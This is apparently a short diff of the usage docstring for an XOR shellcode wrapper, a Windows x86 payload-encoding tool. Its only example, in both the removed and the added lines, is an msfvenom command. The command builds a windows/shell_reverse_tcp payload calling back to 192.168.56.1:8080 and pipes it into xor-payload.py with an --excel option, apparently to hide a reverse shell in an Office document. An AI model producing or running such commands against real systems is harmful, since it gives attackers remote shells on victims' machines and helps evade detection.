@@ -2,8 +2,7 @@
 XOR-encoded shellcode wrapper for Windows x86-32 (works fine on x86-64)
 
 Example:
-$ msfvenom -p windows/shell_reverse_tcp -e x86/shikata_ga_nai \
-  --format raw -b '\x00\xff' LHOST=192.168.56.1 LPORT=8080 \
+$ msfvenom -p windows/shell_reverse_tcp -f raw -b '\\x00\\xff' LHOST=192.168.56.1 LPORT=8080 \
    2>/dev/null | python xor-payload.py --excel
 
 @_hugsy_
